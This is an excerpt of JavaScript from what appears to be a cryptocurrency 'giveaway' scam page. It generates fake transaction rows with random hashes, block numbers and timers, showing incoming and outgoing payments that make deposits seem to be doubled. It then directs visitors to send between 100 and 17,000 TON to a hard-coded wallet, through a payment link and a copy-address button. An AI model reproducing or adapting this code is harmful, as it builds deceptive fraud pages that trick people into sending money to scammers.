...
function create_transaction(mins) {
  ...
  row.innerHTML =
    '<tr  class="tr"> <td><a class="hash-tag text-truncate" >0x' +
    generateId(63) +
    '</a> </td> <td class="d-none d-sm-table-cell"><a >4' +
    tx(99999999) +
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span> </td> <td><a class="hash-tag text-truncate" >' +
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">ltc1qprdpj4y99q2cnsfggvpzl30ll0c3vgsxy4vhf2</span> </td> <td>' +
    amount +
  ...
  row.innerHTML =
    '<tr> <td><a class="hash-tag text-truncate" >0x' +
    generateId(63) +
    '</a> </td> <td class="d-none d-sm-table-cell"><a >4' +
    tx(99999999) +
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">ltc1qprdpj4y99q2cnsfggvpzl30ll0c3vgsxy4vhf2</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" >' +
    address +
    "</a> </td> <td>" +
    send_amount +
    ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
...
function new_transaction() {
  ...
  (row.innerHTML =
    ...
    '</a> </td> <td class="d-none d-sm-table-cell"><a >4' +
    tx(99999999) +
    '</a></td> <td><span class="timer" >now</span> </td> <td><a class="hash-tag text-truncate" >' +
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">ltc1qprdpj4y99q2cnsfggvpzl30ll0c3vgsxy4vhf2</span> </td> <td>' +
    amount +
    ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
    ...
    setTimeout(() => {
      ...
      (row.innerHTML =
        ...
        '</a> </td> <td class="d-none d-sm-table-cell"><a >4' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">ltc1qprdpj4y99q2cnsfggvpzl30ll0c3vgsxy4vhf2</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" >' +
        address +
        "</a> </td> <td>" +
        send_amount +
        ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
...
(get_random = function (
  ...
  $("#gen-btn").click(() => {
    if ($("#cal-in").val() >= 100 && $("#cal-in").val() <= 17000) {
      ...
      // $("#qrcode_svg").attr('src', 'https://api.qrserver.com/v1/create-qr-code/?data=ethereum%3Altc1qprdpj4y99q2cnsfggvpzl30ll0c3vgsxy4vhf2%3Famount%3D'+amount_entered+'%26message%3DDeposit%2Bto%2B2xcrypto%2Bgiveaway%2Bevent&amp;size=100x100');
      $("#paynow")
        .parent()
        .attr(
          "href",
          "ethereum:UQC67JYR3QZ8zGELZdZFbs1isbOo2psq53Gl95w_bqKGP7xz?amount=" +
            amount_entered
        );
    } else $("#warn").text("Amount should be within 100 TON to 17,000 TON");
  }),
  $("#close").click(() => {
...
$("#copy_address").click(() => {
  $("#copy_address").attr(
    "data-clipboard-text",
    "UQC67JYR3QZ8zGELZdZFbs1isbOo2psq53Gl95w_bqKGP7xz"
  );
